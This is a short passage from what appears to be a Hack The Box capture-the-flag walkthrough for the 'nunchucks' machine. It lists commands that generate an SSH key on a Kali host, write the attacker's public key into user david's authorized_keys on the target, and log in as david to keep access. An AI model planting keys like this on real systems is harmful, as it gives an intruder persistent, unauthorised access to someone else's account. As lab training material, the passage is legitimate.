___

```bash
ssh-keygen -t ed25519 -f /home/kali/Desktop/HTB/nunchucks/keys
```

Write SSH key into .ssh/authorized keys

```bash
mkdir /home/david/.ssh
```

Add the public key (.pub)

```
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOrQ3ZnQRDgSiLOG0I6f1wbjIrbqKg4J1TuuAd3wEJfq kali@kali > /home/david/.ssh/authorized_keys
```

Set permissions to 600

```
chmod 600 /home/david/.ssh/authorized_keys
```


Login with ssh

```
ssh -i ~/keys/keys david@nunchucks.htb
```
